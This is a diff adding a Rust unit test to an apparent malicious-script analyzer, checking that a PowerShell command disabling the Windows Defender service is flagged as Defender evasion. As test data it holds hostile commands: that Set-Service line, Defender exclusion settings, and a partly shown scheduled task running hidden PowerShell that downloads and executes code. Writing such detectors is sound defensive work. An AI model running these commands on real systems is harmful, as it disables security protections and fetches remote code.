@@ -2775,6 +2775,23 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_set_service_defender_displayname_disabled_emits_trait() {
+        let script = br#"powershell -Command "Set-Service -DisplayName 'Windows Defender Antivirus Service' -StartupType Disabled""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::DefenderEvasion { action, target }
+                    if action == "powershell-service-disabled"
+                        && target == "Windows Defender Antivirus Service"
+            )),
+            "PowerShell Defender display-name service disablement was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn set_mppreference_exclusions_emit_defender_evasion_traits() {
         let script = br#"powershell -Command "Set-MpPreference -ExclusionPath 'C:\Users\Public' -ExclusionProcess calc.exe"
 "#;
